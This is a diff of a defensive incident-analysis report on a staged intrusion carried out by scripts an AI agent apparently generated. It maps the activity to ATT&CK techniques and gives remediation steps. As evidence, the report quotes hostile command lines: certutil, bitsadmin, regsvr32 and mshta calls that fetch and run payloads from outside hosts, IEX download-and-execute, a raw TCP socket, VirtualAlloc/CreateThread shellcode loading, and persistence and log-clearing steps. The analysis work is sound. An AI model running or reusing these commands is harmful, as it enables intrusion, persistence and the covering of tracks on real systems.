@@ -12,53 +12,53 @@ Summary
   intel hits  0
 
 Timeline   (step, time, role, file)
-  1  20261020_100000  script  20261020_100000_step01_recon.ps1
+  1  2026-10-20T10:00:00Z  script  20261020_100000_step01_recon.ps1
       tools       out-file, whoami, nltest, net.exe, wmic.exe
       tactics     Discovery
       wrote       recon_20261020_100030.txt
       indicators  1
-  1  20261020_100030  output  recon_20261020_100030.txt
-  2  20261020_100500  script  20261020_100500_step02_download.ps1
+  1  2026-10-20T10:00:30Z  output  recon_20261020_100030.txt
+  2  2026-10-20T10:05:00Z  script  20261020_100500_step02_download.ps1
       tools       certutil.exe, certutil, bitsadmin.exe, start-bitstransfer
       tactics     CommandAndControl
       activities  FileDownload
       transforms  Base64Decode
       indicators  4
-  3  20261020_101000  script  20261020_101000_step03_exec.ps1
+  3  2026-10-20T10:10:00Z  script  20261020_101000_step03_exec.ps1
       tools       rundll32.exe, regsvr32.exe, mshta, msbuild.exe, cmd.exe, installutil.exe
       tactics     Execution, Stealth
       activities  SignedBinaryProxyExecution
       indicators  4
-  3  20261020_101200  output  build_20261020_101200.xml
+  3  2026-10-20T10:12:00Z  output  build_20261020_101200.xml
       tactics     CommandAndControl
       activities  FileDownload
       indicators  6
-  4  20261020_101500  script  20261020_101500_step04_persist.ps1
+  4  2026-10-20T10:15:00Z  script  20261020_101500_step04_persist.ps1
       tools       schtasks.exe, rundll32.exe, reg.exe, wevtutil
       tactics     Persistence, Execution, DefenseImpairment, Stealth
       activities  SignedBinaryProxyExecution, RunKeyPersistence, ScheduledTaskCreation, EventLogClearing
-  5  20261020_102000  script  20261020_102000_step05_dotnet.ps1
+  5  2026-10-20T10:20:00Z  script  20261020_102000_step05_dotnet.ps1
       tools       new-object, [system.io.file]::writeallbytes
       tactics     CommandAndControl, Stealth
       activities  FileDownload, ReflectiveCodeLoading
       transforms  Base64Decode, Crypto:Aes, TextEncoding, Stream, GZip
       indicators  2
-  6  20261020_102500  script  20261020_102500_step06_pinvoke.ps1
+  6  2026-10-20T10:25:00Z  script  20261020_102500_step06_pinvoke.ps1
       tools       add-type, new-object, cmd.exe, whoami, iex, powershell.exe
       tactics     Execution, Discovery, CommandAndControl, Stealth
       activities  FileDownload, DownloadAndExecute, NativeApiCall, RuntimeCompilation, ProcessStart, NetworkSocket
       transforms  EncodedCommand
       indicators  4
-  6  20261020_102600  other   loader_20261020_102600.cs
+  6  2026-10-20T10:26:00Z  other   loader_20261020_102600.cs
       tactics     CommandAndControl, Stealth
       activities  FileDownload, ReflectiveCodeLoading
       indicators  3
-  7  20261020_103000  script  20261020_103000_step07_cleanup.bat
+  7  2026-10-20T10:30:00Z  script  20261020_103000_step07_cleanup.bat
       tools       certutil, wevtutil, del
       tactics     DefenseImpairment, CommandAndControl
       activities  FileDownload, EventLogClearing
       indicators  2
-  7  20261020_103500  output  proc_20261020_103500.jsonl
+  7  2026-10-20T10:35:00Z  output  proc_20261020_103500.jsonl
       tools       certutil, powershell.exe, regsvr32, schtasks, rundll32.exe, wevtutil
       tactics     Execution, Persistence, DefenseImpairment, CommandAndControl, Stealth
       activities  FileDownload, SignedBinaryProxyExecution, ScheduledTaskCreation, EventLogClearing
@@ -79,7 +79,7 @@ Findings
         what  certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\Users\Public\a.b64 (20261020_100500_step02_download.ps1:1)
               bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\Users\Public\b.bin (20261020_100500_step02_download.ps1:3)
               Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\Users\Public\c.bin (20261020_100500_step02_download.ps1:4)
-              and 6 more in the saved report
+              and 6 more in the saved findings
     [x] NetworkSocket               1 line   CommandAndControl             T1095, AML.T0072
         what  $tcp = New-Object System.Net.Sockets.TcpClient("203.0.113.30", 443) (20261020_102500_step06_pinvoke.ps1:10)
     [x] RunKeyPersistence           1 line   Persistence                   T1547.001, AML.T0142
@@ -102,7 +102,7 @@ Findings
         what  rundll32.exe C:\Users\Public\a.dll,Start (20261020_101000_step03_exec.ps1:1)
               regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)
               mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)
-              and 6 more in the saved report
+              and 6 more in the saved findings
   indicators
     [x] Domain          Microsoft.Net                                        build_20261020_101200.xml
     [x] Domain          System.Net                                           build_20261020_101200.xml, loader_20261020_102600.cs
@@ -191,7 +191,7 @@ Impact
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 5 more in the saved report
+               and 5 more in report.json
       basis    FileDownload, DownloadAndExecute, NetworkSocket
   [x] Defences and logging impaired
       Logs were cleared or security tooling was interfered with. Records of this period are incomplete.
@@ -210,7 +210,7 @@ Impact
                NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)
                NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)
                SignedBinaryProxyExecution: rundll32.exe C:\Users\Public\a.dll,Start (20261020_101000_step03_exec.ps1:1)
-               and 11 more in the saved report
+               and 11 more in report.json
       basis    ReflectiveCodeLoading, NativeApiCall, SignedBinaryProxyExecution, RuntimeCompilation, DownloadAndExecute, ProcessStart
   [!] Commands generated by an AI agent
       The scripts were written by an AI agent, which is the premise of this tool. Generated commands differ from run to run, so a detection that matches exact text misses them.
@@ -244,7 +244,7 @@ Remediation   (most urgent first)
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 5 more in the saved report
+               and 5 more in report.json
       basis    FileDownload, DownloadAndExecute, NetworkSocket
   [!] Find the delivered files
       Collect the files that were downloaded, dropped or loaded, hash them, and search every host for the same hashes.
@@ -255,7 +255,7 @@ Remediation   (most urgent first)
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 20 more in the saved report
+               and 20 more in report.json
       basis    FileDownload, DownloadAndExecute, ReflectiveCodeLoading, SignedBinaryProxyExecution, RuntimeCompilation, NativeApiCall, ProcessStart
   [!] Recover the missing logs
       Treat local logs as incomplete, and recover the period from a central collector or a backup.
